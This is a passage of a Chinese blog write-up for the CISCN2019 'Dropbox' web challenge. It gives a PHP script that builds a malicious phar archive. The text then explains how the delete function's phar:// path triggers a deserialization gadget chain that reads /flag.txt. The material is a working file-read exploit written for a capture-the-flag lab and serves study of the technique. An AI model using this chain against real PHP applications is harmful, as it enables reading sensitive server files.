+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>生成的a.phar修改后缀上传，之后需要找触发方式，此处需要注意一点设置了目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>而只有delete.php中的目录是在题目给定的文件上传沙盒中的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>故只有delete操作能直接<code>phar://</code>触发反序列化。</p>
+<p>call函数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;<span class="comment">//调用魔法函数__call</span></span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>array_push($this-&gt;funcs, $func);</code> 这里 $func 就是 close</p>
+<p><code>$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</code>里面的  <code>$file-&gt;$func()</code> 就是 /flag.txt的内容   所以这个方法将 /flag.txt的 内容写进了$results</p>
+<p>它将Filelist类中的files数组全部遍历了一遍，并执行对应的<code>func()</code>结果被存进result。之后的<code>__destruct()</code>方法则会将result等等结果打印出来。</p>
+<p>再注意到User类的<code>__destruct()</code>方法</p>
+<p>原本只是一个同名<code>close()</code>函数，但是此处却存在着可利用之处。假如我们的文件上传的是User类的对象。销毁时自然会执行<code>close()</code>函数。但如果把<code>db</code>设置为Filelist类的对象，那么<code>db-&gt;close()</code>执行时将找不到<code>close()</code>函数，进而执行其<code>files</code>数组里的每一个函数。那么如果<code>files</code>数组里是存在同名函数<code>close</code>的File类对象，就能成功执行文件读取。</p>
+<p><code>__destruct()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>foreach ($this-&gt;results as $filename =&gt; $result) 每次把每个一级数组的值，传递给$result,即filename1[]</li>
+</ul>
+<ul>
+<li>foreach ($result as $func =&gt; $value) 每次把每个二级数组的值，传递给$value</li>
+</ul>
+<ul>
+<li>echo table 最后打印出来全部数据</li>
+</ul>
+<p>参:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102844554">https://blog.csdn.net/weixin_44077544/article/details/102844554</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ca36dfed3fdb">https://www.jianshu.com/p/ca36dfed3fdb</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/05/30/CISCN2019Web1-Dropbox%E6%B7%B1%E5%BA%A6%E8%A7%A3%E8%AF%BB/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/06/01/vmware%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            vmware三种网络工作模式
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/05/13/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">从一道题学习java反序列化</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
